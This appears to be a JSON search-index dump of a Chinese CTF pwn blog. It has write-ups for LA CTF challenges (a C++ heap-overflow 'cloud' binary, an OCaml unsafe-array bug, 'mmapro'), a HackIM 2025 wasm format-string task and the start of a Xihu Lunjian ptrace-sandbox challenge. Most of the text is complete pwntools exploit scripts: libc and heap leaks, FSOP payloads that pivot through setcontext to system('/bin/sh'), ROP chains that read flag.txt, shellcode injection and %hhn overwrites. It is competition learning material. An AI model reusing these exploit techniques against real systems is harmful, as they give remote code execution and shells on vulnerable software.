absorb(std::string_view moisture = \"\") {  std::cout &lt;&lt; moisture;  T h2o{};  if (!(std::cin &gt;&gt; h2o)) {    std::cout &lt;&lt; \"dehydrated :(\\n\";    std::exit(1);  }  return h2o;}int main() {  Cloud&lt;Cloud&lt;int&gt;&gt; clouds;  while (true) {    for (auto i = 0uz; i &lt; clouds.precipitation(); ++i) {      std::cout &lt;&lt; \"cloud \" &lt;&lt; i                &lt;&lt; \": precipitation = \" &lt;&lt; clouds[i].precipitation()                &lt;&lt; \", saturation = \" &lt;&lt; clouds[i].saturation() &lt;&lt; \", rain = \";      for (auto j = 0uz; j &lt; clouds[i].precipitation(); ++j) {        std::cout &lt;&lt; clouds[i][j] &lt;&lt; ' ';      }      std::cout &lt;&lt; '\\n';    }    std::cout &lt;&lt; \"0. add cloud\\n1. forecast\\n2. pour\\n3. exit\\n\";    auto gauge = absorb&lt;int&gt;(\"&gt; \");    switch (gauge) {    case 0: {      clouds.pour(Cloud&lt;int&gt;());    } break;    case 1: {      auto cell = absorb&lt;std::size_t&gt;(\"cell: \");      auto sat = absorb&lt;std::size_t&gt;(\"saturation: \");      clouds[cell].forecast(sat);    } break;    case 2: {      auto cell = absorb&lt;std::size_t&gt;(\"cell: \");      auto drop = absorb&lt;int&gt;(\"drop: \");      clouds[cell].pour(drop);    } break;    default:      return 0;    }  }}从源码不太能看出漏洞‍​​‍例如oldsize 是 0x208, if 判读的时候 newsize 是 0x4000000000000040​ 大于 old size,然后进入分配内存分支但是在调用 aligned_alloc​ 时，它会 把 newsize * 4  这就会导致 数据溢出 只保留了 0x100,然后执行到这里就会 出现堆溢出的漏洞 memmove(new_ptr, old_ptr, old_use_size);​&gt;&gt;&gt; old_size = 0x208&gt;&gt;&gt; new_size = 0x10000000000000100 / 4&gt;&gt;&gt; hex(new_size)0x4000000000000040&gt;&gt;&gt; hex((0x4000000000000040 * 4) &amp; ((1&lt;&lt;64)-1))0x100# ‍  注意 每次发送的数值貌似 不能超过 0x7FFFFFFF​ 不然会报错退出  所以需要一点概率，不能分段发送这样的  0x75aa aFFFFFFF​‍  exploit# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'chall.lac.tf 31234'.replace(' ',':')binary = './chall'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)#context(log_level = 'debug')context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libc#elf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#impor socks#context.proxy = (socks.SOCKS5, '192.168.31.253', 10808)gdbscript = '''brva 0x014F5brva 0x01338#continue'''.format(**locals())#io = remote(*attack.split(':'))def add_cloud():    ru('&gt; ')    sl('0')# malloc ptrdef forecast(idx, size):     ru('&gt; ')    sl('1')    ru('cell: ')    sl(str(idx))    ru('saturation:')    sl(str(size//4))# write p32#def pour(idx,data):def edit(idx,data):    ru('&gt; ')    sl('2')    ru('cell: ')    sl(str(idx))    ru('drop: ')    sl(str(data))for i in range(1000):    io = start([])    # add cloud    try:        add_cloud()        add_cloud()        add_cloud()        add_cloud()        forecast(0,0x208)        forecast(1,0x108)        forecast(2,0x108)        forecast(3,0x108)        # re cloud        add_cloud() # 4        forecast(2,0x118)        #        #forecast(4,0x118)        #        for i in range(0x100//4):            edit(0,i)        #  exp        edit(0,0xbeef)        edit(0,0xbeef)        edit(0,0x511)        add_cloud() # 5        add_cloud() # 6        forecast(5,0x200)        forecast(6,0x200)        forecast(0,0x10000000000000000+0x108)        forecast(3, 0x128)        edit(2, 0xbeef11)        edit(2, 0xbeef22)        add_cloud() # 7        forecast(7,0x1d0)        # leak libc        ru('cloud 2: ')        ru('rain = ')        x =  rl().strip().split(b' ')        libc_base = int(x[0]) + (int(x[1])&lt;&lt;32) - 0x203b20        lss('libc_base')        forecast(3,0x138)        forecast(3,0x238)        # leak heap        ru('cloud 2: ')        ru('rain = ')        x =  rl().strip().split(b' ')        key = int(x[0]) + (int(x[1])&lt;&lt;32)        heap_base = key &lt;&lt; 0xC        lss('key')        lss('heap_base')        forecast(1,0x1d8)        #edit(1,0x1234)        add_cloud() # 8        forecast(8,0x1e8)        forecast(8,0x218)        forecast(1,0x218)        libc.address = libc_base        target = (libc.sym['_IO_2_1_stderr_']-0x30) ^ key        t1 = target &amp; 0xFFFFFFFF        t2 = target &gt;&gt; 0x20        for i in range(6):            edit(5,0x4321)        edit(5,0x1f0)        edit(5,0)        edit(5,t1)        edit(5,t2)        add_cloud() # 9        add_cloud() # 10        forecast(9 , 0x1e8)        forecast(10, 0x1e8)        _stderr = libc.sym['_IO_2_1_stderr_']        fake_IO_addr = _stderr        pay = flat({            0x00: 0,            0x18: libc.sym['setcontext']+61, # CALL1            0x68: next(libc.search(b'/bin/sh')), # CALL1            0xa0: fake_IO_addr-0x30,            0xa8: libc.sym['setcontext'] + 334, # CALL2 # ret 调整 stack, 然后 system            0x88: fake_IO_addr,            0xc0: 1,                # mode            0xe0-0x30: fake_IO_addr,            #0xd8: libc.sym['_IO_wfile_jumps'] + 0x30,            0xd8: libc.sym['_IO_wfile_jumps']-0x30+0x10,            },filler=b'\\x00')        p1  = p64(libc.sym['system']) * 2 + p64(libc.sym['_IO_2_1_stderr_']) + p64(1) + p64(fake_IO_addr) + p64(0)        p1 += pay        #pause()        for i in range(0,len(p1),4):            d1 = u32(p1[i:i+4])            edit(10,d1)    except:        io.close()        continue    ru('&gt; ')    sl('1')    ru('cell: ')    sl('a')    sleep(0.1)    sl('ls')    sl('\\ncat flag.txt\\n')    sleep(0.1)    print(io.recv())    print(io.recv())    print(io.recv())    print(io.recv())    print(io.recv())    exit(0)#target = heap_base + 0xef0##t1 = target &amp; 0xFFFFFFFF#t2 = target &gt;&gt; 0x20#edit(10,t1)#edit(10,t2)###fake_IO_addr = heap_base + 0xef0#fake_IO_addr = target##RCE  = 0x111#RCE2 = 0x222#pay = flat({#    0x00: 0,#    0x20: fake_IO_addr,#    0x28: 0xff,#    0x60: RCE,#    0x68: 0,          # rdi#    0x70: fake_IO_addr, # rsi#    0x88: fake_IO_addr, # rdx#    0xA0: fake_IO_addr,#    0xA8: RCE2,#    0xC0: 1, # mode#    0xd8: libc.sym['_IO_wfile_jumps'] + 0x30, # vtable # 可以控制虚表的走向#    #0xe0: fake_IO_addr + 0x48,#}, filler=b\"\\x00\")#pay = flat({#    0x00: 0,#    0x18: libc.sym['setcontext'] + 61, # CALL1#    0x68: next(libc.search(b'/bin/sh')), # CALL1#    0xa0: fake_IO_addr-0x30,#    0xa8: libc.sym['setcontext'] + 334, # CALL2 # ret 调整 stack, 然后 system#    0x88: fake_IO_addr,#    0xc0: 1,                # mode#    0xe0-0x30: fake_IO_addr,#    0xd8: libc.sym['_IO_wfile_jumps'] + 0x30,#},filler=b'\\x00')#print('start write payload....')##lss('key')#lss('heap_base')##gdb.attach(io,'''#b exit*#b *_IO_flush_all##'''#)‍  打远程太慢了，跑了好久才出来​​‍unsafe‍  源码 unsage.mllet vuln arr size =  let rec get_data i =     print_endline \"input index-value pairs please\";    let index = read_int () in    let value = read_int () in      match i with      | 0 -&gt; ()      | 10 -&gt; Array.unsafe_set arr index value; get_data (i-1) # 第一次可以任意偏移写 size_t      | _ -&gt; Array.set arr index value; get_data (i-1) # 后面的就只能在 5 以内了    in  get_data size;  print_endline \"leggo\"let leak arr =  print_endline \"leak where\";  let index = read_int () in  Array.unsafe_get arr indexlet main () =  let arr = Array.make 5 0 in  print_endline \"are you readyyy\";  print_endline (\"leakk 1: \" ^ string_of_int (leak arr)); # 两次任意偏移泄露  print_endline (\"leakk 2: \" ^ string_of_int (leak arr)); # 两次任意偏移泄露  vuln arr 10;  print_endline \"i wonder if you won\"let () = main ()‍这题比较玄学，两次任意偏移泄露出的地址 是 leak = leakkdata / 2​输入的数据也要 /​‍思路arr 的地址 和 libc 是有固定偏移的- 两次任意偏移泄露 - 泄露 environ 的地址 - 然后 泄露 libc 的地址然后就是一次任意写 （由于已经知道 stack 和 libc 的地址 我们就可以计算它的差值）修改stack返回地址 可以改成 pop rsp ;ret (返回地址下面就是 arr 数组的位置) 然后就可以rop 了​​‍  坑点1arr 距离 libcbase 的地址 本地和远程是不一样的，这个就需要调试了例如 远程恰好泄露的是 libc 只读段里的数据​然后远程泄露出来的 是 1051808​ 那我们就利用 search 搜索大概位置 然后就可以确定 offset​​  坑点2远程 我尝试 使用 system，mprotect  和 puts  都没用正常 执行后通过 gets  构造 ORW ROP 才成功 get flag‍# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'chall.lac.tf 31271'.replace(' ',':')binary = './chall'#binary = './run'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)#context(log_level = 'debug')context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))#libc = context.binary.libc#elf  = ELF(binary)#print(context.binary.libs)libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''brva 0x020490brva 0x02044Dbrva 0x02044D#continue'''.format(**locals())#io = remote(*attack.split(':'))#for i in range(10000):#    try:#        io = start([])#        ru('leak where\\n')#        #offset = (2094064//8) - 7 + i#        offset = (2090000//8) - 7 + i#        sl(str(offset))#        ru('leakk 1: ')#        elf_addr = int(rl())#        if elf_addr == 1357209388780:#            lss('elf_addr')#            lss('i')#            itr()#        io.close()#    except:#        pass#io = start([])#cmd = 'chroot --userspec=0:0 ./docker /run'#io = process(cmd.split(' '))remote_offset = (0x1ff370 - 0x1fafe0) // 8local_ooffset = (0x1ff3f0 - 0x38) // 8offset = local_ooffset#offset = remote_offsetlss('offset')stack_offset = offset + (libc.sym['environ'] // 8)ru('leak where\\n')sl(str(stack_offset))ru('leakk 1: ')stack_addr = int(rl()) * 2lss('stack_addr')libc_offset = offset + (libc.sym['_IO_list_all'] // 8)ru('leak where\\n')sl(str(libc_offset))ru('leakk 2: ')libc_base = int(rl()) * 2 - libc.sym['_IO_2_1_stderr_']lss('libc_base')libc.address = libc_base#gdb.attach(io,gdbscript=gdbscript)ru(b'input index-value pairs please\\n')#pop_rsp = libc_base + 0x00000000001109ae#pop_rsp = libc_base + 0x000000000003c058 -2pop_rsp = libc_base + 0x000000000002a773pop_rdi = libc_base + 0x000000000010f75bpop_rdi_rbp = libc_base + 0x000000000002a873ret = stack_addr - 560lss('ret')pause()ret_offset = offset + (ret - libc_base) // 8sl(str(ret_offset))sleep(0.1)sl(str(pop_rsp//2))#sl(str((libc_base + 0x02882f)//2))#sl(str(pop_rsp//2))rop = [2] * 9x = -1x+=1;rop[x] = libc.bss() + 0x800x+=1;rop[x] = pop_rdix+=1;rop[x] = (libc_base - (offset*8))x+=1;rop[x] = libc.sym['gets']#x+=1;rop[x] = libc.sym['system']print(rop)for i in range(len(rop)):    ru(b'input index-value pairs please\\n')    if i &gt; 4:        sl('4')    else:        sl(str(i))    sleep(0.1)    sl(str(rop[i]//2))ru(b'input index-value pairs please\\n')sl('4')sl('0')pause()g1      =libc_base + 0x00000000000586d4 # pop rbx ; retg2      =libc_base + 0x00000000000b0123 # mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; retpop_rsi =libc_base + 0x0000000000110a4d # pop rsi ; retpop_rsi =libc_base + 0x000000000010f759 # pop rsi ; pop r15 ; retpop_rax = libc_base + 0x00000000000dd237xx = libc_base - (offset*8)sc = '''loop:    jmp loop'''pay  = b'A' * 7pay += b'B' * 0x18pay += p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(xx+0xb8+0xa0) + p64(pop_rsi) + p64(0) * 2pay += p64(g1) + p64(0) + p64(g2) + p64(0) * 3pay += p64(libc.sym['read']+15)# writepay += p64(pop_rdi)pay += p64(3)pay += p64(pop_rsi) pay += p64(libc.bss()) * 2pay += p64(g1) + p64(0x100) + p64(g2) + p64(0) * 3pay += p64(libc.sym['read'])# writepay += p64(pop_rdi)pay += p64(1)pay += p64(pop_rsi) pay += p64(libc.bss()) * 2pay += p64(g1) + p64(0x100) + p64(g2) + p64(0) * 3pay += p64(libc.sym['write'])pay += p64(xx+0x100)pay += b'./flag.txt'pay += b'\\x00' * 0x200pay += asm(sc)sl(pay)#for i in range(1,11):#    ru(b'input index-value pairs please\\n')#    sl(str(i%5))#    sleep(0.1)#    sl(str(rop[i]))itr()#lss('elf_addr')#lss('libc_addr')#ru('leak where\\n')#sl(str(51))#gdb.attach(io)#ru('leak where\\n')#sl(str(0x10))#ru('leak where\\n')#sl(str(0x42424242))#pay = flat({#},filler=b'\\x00')#gdb.attach(io,gdbscript)mmapro‍‍  爆破脚本# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'chall.lac.tf 31179'.replace(' ',':')binary = './mmapro'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)#context(log_level = 'debug')context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libcelf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''#continue'''.format(**locals())#io = remote(*attack.split(':'))#pay = flat({# ► 0x629ebacb8227 &lt;main+142&gt;    call   mmap@plt                    &lt;mmap@plt&gt;#         addr: 0#         len: 1#         prot: 2#         flags: 3#         fd: 4#         offset: 5#lll = 0x10000 + 0x1000 * 8for i in range(100):    print(i)    io = start([])    libc_base = uu64(r(8)) - libc.sym['mmap']    target = (libc_base + libc.sym['mmap'])    aa = (target&gt;&gt;0xc&lt;&lt;0xc)    pay  = p64(aa) # addr    pay += p64(0x1000*i+(aa-libc_base)) # length    pay += p64(7) # prot    pay += p64(1 | 0x20 | 0x10) # flags    #pay += p64(2) # flags    pay += p64(0x414141414141) # fd    pay += p64(0) # offset    #pay = flat([0,0x50,7,2,0,0])    #},filler=b'\\x00')    gdb.attach(io,f'''c''')    sl(pay)    itr()‍‍  i = 87 的时候  这个 0x31 其实就 mmap 的 flags 位置​​‍  后面就是 慢慢调整数据了‍  exploit# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = 'chall.lac.tf 31179'.replace(' ',':')binary = './mmapro'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)#context(log_level = 'debug')context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libcelf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''brva 0x001227#continue'''.format(**locals())#io = remote(*attack.split(':'))#mmap = libc.sym['mmap']#rop = ROP(libc)#xx = rop.find_gadget(['add rsp, 0x20'])#print(xx)##for i in xx:##    if ((i &amp; 0xff) == 0x31 and i &lt; mmap):##        print('yes')##exit()io = start([])libc_base = uu64(r(8)) - libc.sym['mmap']#pay = flat({# ► 0x629ebacb8227 &lt;main+142&gt;    call   mmap@plt                    &lt;mmap@plt&gt;#         addr: 0#         len: 1#         prot: 2#         flags: 3#         fd: 4#         offset: 5#lll = 0x10000 + 0x1000 * 8target = (libc_base + libc.sym['mmap'])offset = 0aa = (target&gt;&gt;0xc&lt;&lt;0xc) - offsetpay  = p64(aa) # addrpay += p64(0x1000*87 + offset) # lengthpay += p64(7) # prot#pay += p64(libc_base + 1 | 0x20 | 0x10) # flags#pay += p64(libc_base +0x22000+ 0x31+0x600) # flagsZZpay += p64(libc_base +0x22000+ 0x31+0x600) # flagsZZlibc.address = libc_basepay += p64(libc.sym['gets']) # fdpay += p64(libc_base+0x22000) # offsetprint(hexdump(pay))#pay = flat([0,0x50,7,2,0,0])#},filler=b'\\x00')gdb.attach(io,f''' b *mmap64+21''')s(pay)pause()#pay  = p64(0x111)#pay += p64(0x222)#pay += p64(0x333)#pay += p64(0x444)#pay += p64(0x555)#pay += p64(0x666)pay = 0xf80 * b'\\x90' + asm(shellcraft.sh())sl(pay)itr()‍‍"
  },
  
  {
    "title": "HACKIM 2025 CTF 一道wasm pwn题分享",
    "url": "/posts/Nullcon-Goa-HackIM-2025-CTF/",
    "categories": "",
    "tags": "",
    "date": "2025-02-02 00:00:00 +0800",
    





    
    "snippet": "  nullcon HackIM CTF Goa 2025!wat-wasm转换chat gpt​.wat​ 文件通常是 WebAssembly (Wasm) 文本格式（WebAssembly Text Format）。如果你想在 Linux 上运行 .wat​ 文件，首先需要将它转换为 WebAssembly 二进制格式（.wasm），然后使用 WebAssembly 运行时环境（如 No...",
    "content": "  nullcon HackIM CTF Goa 2025!wat-wasm转换chat gpt​.wat​ 文件通常是 WebAssembly (Wasm) 文本格式（WebAssembly Text Format）。如果你想在 Linux 上运行 .wat​ 文件，首先需要将它转换为 WebAssembly 二进制格式（.wasm），然后使用 WebAssembly 运行时环境（如 Node.js 或浏览器）运行它。步骤：      安装 ​wasi-sdk​​ 或 ​wasmer​​ 等工具：          如果你要直接使用 WebAssembly，可以安装 wasmer​ 或 wasi-sdk​，它们提供了运行 .wasm​ 文件的功能。         curl https://get.wasmer.io -sSfL | sh        或者安装 wasi-sdk​ 来编译和运行 WebAssembly。        将  ​.wat​​ 转换为  ​.wasm​​ ：  可以使用 wat2wasm​ 工具将 .wat​ 转换为 .wasm​ 文件：     wat2wasm file.wat -o file.wasm        如果没有安装 wat2wasm​，你可以从 WebAssembly Binary Toolkit (wabt) 安装它。        运行  ​.wasm​​ 文件：  使用 wasmer​ 来运行 WebAssembly 文件：     wasmer run file.wasm        或者，如果你有 Node.js 环境，也可以在 JavaScript 中加载和运行 .wasm​ 文件。  示例：假设有一个简单的 .wat​ 文件 example.wat​:(module  (func $add (param $x i32) (param $y i32) (result i32)    local.get $x    local.get $y    i32.add)  (export \"add\" (func $add)))你可以将其转换为 .wasm​，然后使用 wasmer​ 运行：wat2wasm example.wat -o example.wasmwasmer run example.wasm --invoke add 1 2这将运行 WebAssembly 模块，并返回计算结果。希望这对你有帮助！‍Tools➜  wasmup proxychains4 -q curl https://get.wasmer.io -sSfL |proxychains -q shWelcome to the Wasmer bash installer!               ww               wwwww        ww     wwwwww  w        wwwww      wwwwwwwwwww      wwwwww  w     wwwwwwwwwwww      wwwwwwwwww   wwwwwwwwwww  w      wwwwwww  wwwwwwwwwwwwwwwwwww   wwwww  wwwwwwwwwwwwwwwwwwww  wwwww  wwwwwwwwwwwwwwwwwwww  wwwww  wwwwwwwwwwwwwwwwwwww  wwwww  wwwwwwwwwwwwwwwwwwww  wwwww   wwwwwwwwwwwwwwwwwww  wwwww   wwwwwwwwwwww   wwww       wwwwwwww           wwwwdownloading: wasmer-linux-amd64Latest release: v5.0.4Downloading archive from https://github.com/wasmerio/wasmer/releases/download/v5.0.4/wasmer-linux-amd64.tar.gz######################################################################## 100.0%installing: /root/.wasmerUpdating bash profile /root/.zshrcwe've added the following to your /root/.zshrcIf you have a different profile please add the following:# Wasmerexport WASMER_DIR=\"/root/.wasmer\"[ -s \"$WASMER_DIR/wasmer.sh\" ] &amp;&amp; source \"$WASMER_DIR/wasmer.sh\"check: wasmer 5.0.4 installed successfully ✓                                                                                                                                                        wasmer will be available the next time you open the terminal.If you want to have the commands available now please execute:source /root/.wasmer/wasmer.sh➜  wasmup  安装sudo apt-get install wabt  测试运行$ wat2wasm wasmup.wat -o wasmup.wasm # wat 转 wasm$ wasmup wasmer run wasmup.wasm      # 运行&gt; Are you all alone?111&gt; haha. What you doing son?‍‍HackIMCTF-2025-Pwn-wasmup程序分析附件给了一个 wat 文件wasmup.wat​​‍wat 转成 wasm 后 使用 JEB 工具，就可以反编译 c 代码进行分析了‍// Stale decompilation - Refresh this view to re-decompile this codeint main() {    int v0 = __g0 - 112;    __g0 -= 112;    *(int*)(v0 + 108) = 0;    *(int*)(v0 + 103) = *(int*)&amp;aFunc____p_[7];    *(long long*)(v0 + 96) = *(long long*)&amp;aFunc____p_[0];    *(short*)(v0 + 92) = *(short*)&amp;a___s_[&amp;gvar_4];    *(int*)(v0 + 88) = *(int*)&amp;a___s_[0];    *(int*)(v0 + 60) = 1; // 这里赋值 offset 1     *(int*)(v0 + 56) = 2;    nobuffer();    while(1) {        int v1 = *(int*)(*(int*)(v0 + 60) * &amp;gvar_4 + (int)&amp;gvar_40000000)(v0 + 64);        *(int*)(v0 + &amp;gvar_20) = v1;        printf(v0 + &amp;gvar_20, v0 + 88);        *(char*)(v0 + 64) = 0;        *(int*)(v0 + 48) = v0 + 64;        scanf(v0 + 48, \"%[^\\n]\");        int v2 = getchar(gvar_C20);        if(v2) {            break;        }        int v3 = r_to_5(gvar_C20);        if(v3) {            break;        }        int v4 = strcmp(\"Wazzsahahahrp\", v0 + 64);        if(!v4) {            break;        }        __f70();        int v5 = strcmp(\"debug\", v0 + 64);        if(v5) {            continue;        }        *(int*)v0 = v0 + 60;        printf(v0, v0 + 96);        *(int*)(v0 + 16) = v0 + 56;        printf(v0 + 16, v0 + 96);    }    exit(0);    jump 0;}‍int v1 = *(int*)(*(int*)(v0 + 60) * &amp;gvar_4 + (int)&amp;gvar_40000000)(v0 + 64);v0 + 60 上面赋值 是1  也就是调用 wassup如果我们可以修改 这个 1 为 2 也就可以 执行 wassflag 了​​‍格式字符串漏洞溢出覆盖原本的 message 然后格式话字符串漏洞​​‍输入 ABCD后 搜索字符串 可以定位到stack位置 , 可以找到变量的对应位置​​​​可以看到 输入的 buf 距离 &gt; %s​ 有 0x18 个字符，这里其实可以覆盖 下面的buf,造成格式话字符串漏洞，‍  经过测试可以得知我们输入的在第9个位置ru(b'&gt; Are you all alone?\\n')pay  = 'A' * 0x18 + '%p-' * 9sl(pay)# 0x498-0-0-0-0x11bb0-0-0x2-0x1-0x41414141-‍  其实 debug 给的 16进制字符串的作用就是stack offset格式化字符串的时候可以看到， 并不是 吧 0x41414141 当作一个地址，而是 当成 一个 偏移，ru(b'&gt; Are you all alone?\\n')pay  = 'AAAABBBBCCCCDDDDEEEEFFFF' + '%p' * 8 + '%s'sl(pay)​​‍利用上面的那一点我们就可以去确定 idx 1 的 offset 然后 使用格式字符串漏洞 去修改 这个 1， 改成2 就可以调用 wassflag​​exploit‍# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))context(log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))#context(log_level = 'info',terminal='tmux splitw -h -l 170'.split(' '))cmd = 'wasmer run wasmup.wasm'.split(' ')#io = process(cmd)io = remote('52.59.124.14',5005)#gdb.attach(io)#pay  = 'A' * 0x18 + 'true, true'ru(b'&gt; Are you all alone?\\n')pay  = p32(0x11bb0-4) + b'A' * 0x1C + b'%p'*8 +b'-'*(0x102-0x1e) +b'%hhn'sl(pay)s('\\n')itr()‍前后对比​​​​‍​​‍"
  },
  
  {
    "title": "第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路",
    "url": "/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/",
    "categories": "",
    "tags": "",
    "date": "2025-01-18 00:00:00 +0800",
    





    
    "snippet": "‍  第八届西湖论剑·中国杭州网络安全安全技能大赛-网络攻防实战赛初赛‍Pwn-babytrace‍patch 成这样，方便调试​​‍  调试脚本# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x...",
    "content": "‍  第八届西湖论剑·中国杭州网络安全安全技能大赛-网络攻防实战赛初赛‍Pwn-babytrace‍patch 成这样，方便调试​​‍  调试脚本# imLZH1from pwn import *#from ctypes import CDLL#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')s    = lambda   x : io.send(x)sa   = lambda x,y : io.sendafter(x,y)sl   = lambda   x : io.sendline(x)sla  = lambda x,y : io.sendlineafter(x,y)r    = lambda x   : io.recv(x)ru   = lambda x   : io.recvuntil(x)rl   = lambda     : io.recvline()itr  = lambda     : io.interactive()uu32 = lambda x   : u32(x.ljust(4,b'\\x00'))uu64 = lambda x   : u64(x.ljust(8,b'\\x00'))ls   = lambda x   : log.success(x)lss  = lambda x   : ls('\\033[1;31;40m%s -&gt; 0x%x \\033[0m' % (x, eval(x)))attack = '119.45.238.17:9999'binary = './babytrace'binary = './fix/babytrace'def start(argv=[], *a, **kw):    if args.GDB:return gdb.debug(binary,gdbscript)    if args.TAG:return remote(*args.TAG.split(':'))    if args.REM:return remote(*attack.split(':'))    return process([binary] + argv, *a, **kw)context(binary = binary, log_level = 'debug',terminal='tmux splitw -h -l 170'.split(' '))libc = context.binary.libcelf  = ELF(binary)#print(context.binary.libs)#libc = ELF('./libc.so.6')#import socks#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)gdbscript = '''#brva 0x0D68brva 0x000D3C#continue'''.format(**locals())#io = rmote()io = start([])def edit(buf,idx,data):    ru('choose one &gt;')    sl('1')    ru(':')    s(buf)    ru('which one?')    sl(str(idx))    ru('set value?')    sl(str(data))def show(idx):    ru('choose one &gt;')    sl('2')    ru('which one?')    sl(str(idx))sleep(0.4)gdb.attach(io.pid+1,gdbscript)#pause()show(-2)ru('num[-2] = ')libc_base = int(rl()) - libc.sym['_IO_2_1_stderr_']‍程序分析‍  父进程通过监控和修改子进程的系统调用及其寄存器状态，实现了一个自定义的沙箱环境。struct user_regs_struct{  __int64 r15;  __int64 r14;  __int64 r13;  __int64 r12;  __int64 rbp;  __int64 rbx;  __int64 r11;  __int64 r10;  __int64 r9;  __int64 r8;  __int64 rax;  __int64 rcx;  __int64 rdx;  __int64 rsi;  __int64 rdi;  __int64 orig_rax;  __int64 rip;  __int64 cs;  __int64 eflags;  __int64 rsp;  __int64 ss;  __int64 fs_base;  __int64 gs_base;  __int64 ds;  __int64 es;  __int64 fs;  __int64 gs;};user_regs_struct v7;......do  {    ptrace(PTRACE_SYSCALL, (unsigned int)pid, 0LL, 0LL);    if ( waitpid(pid, &amp;stat_loc, 0x40000000) &lt; 0 )      error(\"waitpid error2\");    if ( (stat_loc &amp; 0x7F) == 0 || (unsigned __int8)stat_loc == 0x7F 